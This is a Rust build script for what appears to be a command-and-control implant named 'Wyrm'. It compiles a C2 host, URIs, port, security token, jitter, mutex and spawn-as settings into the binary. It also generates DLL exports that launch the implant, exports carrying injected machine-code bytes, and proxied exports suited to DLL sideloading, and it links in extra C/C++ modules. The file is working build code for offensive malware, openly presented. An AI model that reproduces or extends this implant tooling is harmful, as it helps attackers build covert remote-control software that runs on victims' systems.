use std::{
    env,
    fmt::Write,
    fs,
    mem::take,
    path::{Path, PathBuf},
    process::Command,
};

fn main() {
    let envs = &[
        "DEF_SLEEP_TIME",
        "C2_HOST",
        "C2_URIS",
        "C2_PORT",
        "SECURITY_TOKEN",
        "USERAGENT",
        "AGENT_NAME",
        "JITTER",
        "SVC_NAME",
        "EXPORTS_JMP_WYRM",
        "EXPORTS_USR_MACHINE_CODE",
        "EXPORTS_PROXY",
        "MUTEX",
        "DEFAULT_SPAWN_AS",
        "WOF",
    ];

    for key in envs {
        println!("cargo:rerun-if-env-changed={key}");
    }

    for var in envs {
        if let Ok(val) = env::var(var) {
            println!("cargo:rustc-env={var}={val}");
        }
    }

    write_exports_to_build_dir();
    build_static_wofs();
}

/// Writes exported symbols to the binary, whether genuine exports or proxied ones.
fn write_exports_to_build_dir() {
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let dest = out_dir.join("custom_exports.rs");
    let mut code = String::new();

    let exports_usr_machine_code = env::var("EXPORTS_USR_MACHINE_CODE").ok();
    let exports_proxy = env::var("EXPORTS_PROXY").ok();
    let exports_jmp_wyrm = env::var("EXPORTS_JMP_WYRM").ok();

    if let Some(export_str) = exports_jmp_wyrm {
        if export_str.is_empty() {
            // If there was no custom export defined, then we just export the 'run' extern
            writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
        }

        for fn_name in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            writeln!(
                &mut code,
                "build_dll_export_by_name_start_wyrm!({fn_name});",
            )
            .unwrap();
        }
    } else {
        // Just in case.. we still need an entrypoint, tho this should never run
        writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
    }

    if let Some(export_str) = exports_usr_machine_code {
        for item in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            let mut parts = item.split('=');
            let name = parts.next().unwrap().trim();
            let bytes = parts.next().unwrap_or("").trim();

            assert!(!name.is_empty());
            assert!(!bytes.is_empty());

            writeln!(
                &mut code,
                "build_dll_export_by_name_junk_machine_code!({name}, {bytes});",
            )
            .unwrap();
        }
    }

    if let Some(exports) = exports_proxy {
        for item in exports
            .split(';')
            .map(|s| s.trim())
            .filter(|s| !s.is_empty() && s.is_ascii())
        {
            println!("cargo:rustc-link-arg=/export:{item}");
        }
    }

    fs::write(dest, code).unwrap();
}

fn build_static_wofs() {
    let out_dir = PathBuf::from(std::env::var("OUT_DIR").unwrap());
    let dest = out_dir.join("wof.rs");
    let mut ffi_builder = String::new();
    let mut lookup_builder = String::new();

    ffi_builder.push_str("use core::ffi::c_void;\n");
    lookup_builder.push_str("\npub fn all_wofs() -> &'static [(&'static str, *const c_void)] {\n");
    lookup_builder.push_str("&[\n");

    if let Ok(Some(args)) = parse_wof_directories() {
        ffi_builder.push_str("unsafe extern \"C\" {\n");

        for arg in args {
            let mut builder = cc::Build::new();
            builder.out_dir(&out_dir);

            //
            // Iterate through the headers and source files
            //
            for a in arg.headers {
                builder.include(a);
            }

            for a in arg.files {
                builder.file(a);
            }

            for o in arg.object_files {
                let p = Path::new(&o);
                println!("cargo:rustc-link-arg={}", p.display());
                // Grab the symbols that we can then access
                add_symbols(p, &mut ffi_builder, &mut lookup_builder);
            }

            // compile to object files only
            let objects = builder.compile_intermediates();

            for obj in &objects {
                // Give the .obj to the linker
                println!("cargo:rustc-link-arg={}", obj.display());

                // Grab the symbols that we can then access
                add_symbols(obj, &mut ffi_builder, &mut lookup_builder);
            }
        }

        ffi_builder.push_str("}\n\n");
    }

    lookup_builder.push_str("]\n}\n");

    ffi_builder.push_str(&lookup_builder);

    fs::write(dest, ffi_builder).unwrap();
}

/// Parses exported symbols from a compiled object/lib file and extends the
/// generated FFI shim and lookup table code.
///
/// The builders are treated as accumulating code buffers that will later be written out
/// to a generated Rust source file (e.g. `wof.rs`).
fn add_symbols(src: &Path, ffi_builder: &mut String, lookup_builder: &mut String) {
    if let Some(symbols) = dump_symbols(src) {
        for s in symbols {
            let export_line = format!("fn {s}(_: *const c_void) -> i32;\n");
            if !ffi_builder.contains(&export_line) {
                ffi_builder.push_str(&export_line);
                lookup_builder.push_str(&format!("(\"{s}\", {s} as *const c_void),\n"));
            }
        }
    }
}

struct ArgsPerFolder {
    files: Vec<String>,
    headers: Vec<String>,
    object_files: Vec<String>,
}

/// Parses the `WOF` environment variable into per-dir WOF build inputs.
///
/// This helper is used by the build script to discover *WOF modules* laid out
/// on disk. It expects the `WOF` environment variable to contain a semicolon separated
/// list of directories, for example:
///
/// ```text
/// WOF=/wofs_static/1;/wofs_static/2;
/// ```
///
/// For each entry in `WOF`:
///
/// - If the entry resolves to a directory:
///   - All files with extension:
///     - `.h` / `.hpp` are collected into `headers`.
///     - `.c` / `.cpp` / `.cc` are collected into `files`.
///     - `.o` / `.obj` are collected into `object_files`.
fn parse_wof_directories() -> std::io::Result<Option<Vec<ArgsPerFolder>>> {
    if let Some(args) = env::var("WOF").ok() {
        let mut result = Vec::new();

        for item in args.split(';').map(str::trim).filter(|s| !s.is_empty()) {
            let root = PathBuf::from(item);
            if !root.is_dir() {
                continue;
            }

            let mut buf_file = Vec::new();
            let mut buf_headers = Vec::new();
            let mut buf_objs = Vec::new();

            let mut stack = vec![root.clone()];
            while let Some(dir) = stack.pop() {
                for entry in dir.read_dir()? {
                    let entry = match entry {
                        Ok(e) => e,
                        Err(_) => continue,
                    };

                    let path = entry.path();
                    if path.is_dir() {
                        stack.push(path);
                        continue;
                    }

                    let full_path = path.to_string_lossy().to_string();
                    let name = entry.file_name();
                    let name = name.to_string_lossy();

                    if name.ends_with(".h") || name.ends_with(".hpp") {
                        buf_headers.push(full_path);
                    } else if name.ends_with(".c")
                        || name.ends_with(".cpp")
                        || name.ends_with(".cc")
                    {
                        buf_file.push(full_path);
                    } else if name.ends_with(".o") || name.ends_with(".obj") {
                        buf_objs.push(full_path);
                    }
                }
            }

            if !buf_file.is_empty() || !buf_headers.is_empty() || !buf_objs.is_empty() {
                result.push(ArgsPerFolder {
                    files: buf_file,
                    headers: buf_headers,
                    object_files: buf_objs,
                });
            }
        }

        return Ok(Some(result));
    }

    Ok(None)
}

fn dump_symbols(lib: &Path) -> Option<Vec<String>> {
    let out = Command::new("llvm-nm")
        .args(["-U", "-g", "--defined-only"])
        .arg(lib)
        .output()
        .expect("llvm-nm failed");

    let mut buf = Vec::new();

    let stdout = String::from_utf8_lossy(&out.stdout);
    for line in stdout.lines() {
        if line.contains(" T ") {
            let s: Vec<&str> = line.split(" T ").collect();

            if !s.is_empty() && s.len() == 2 {
                buf.push(s[1].to_string());
            }
        }
    }

    if buf.is_empty() {
        return None;
    }

    Some(buf)
}
